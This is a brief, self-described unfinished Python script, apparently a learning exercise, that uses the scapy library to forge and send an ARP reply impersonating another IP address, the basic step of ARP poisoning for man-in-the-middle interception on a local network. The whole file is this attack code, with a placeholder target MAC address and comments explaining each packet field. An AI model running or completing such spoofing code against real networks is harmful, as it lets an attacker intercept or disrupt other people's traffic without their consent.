# NOT FINISHED YET

import scapy.all as scapy

def arp_posioning(target_ip, poisoned_ip):

    # op -> Default value of 1 (Create ARP request). If you want it to be respond you have to change it to 2
    # pdst -> IP field: Set to target IP address.
    # hwdst -> Target Mac address. 
    # psrc -> Router IP address.
    arp_response = scapy.ARP(op=2, pdst = target_ip, hwdst = "##:##:##:##:##:##", psrc = poisoned_ip)
    scapy.send(arp_response)
    scapy.ls(scapy.ARP())
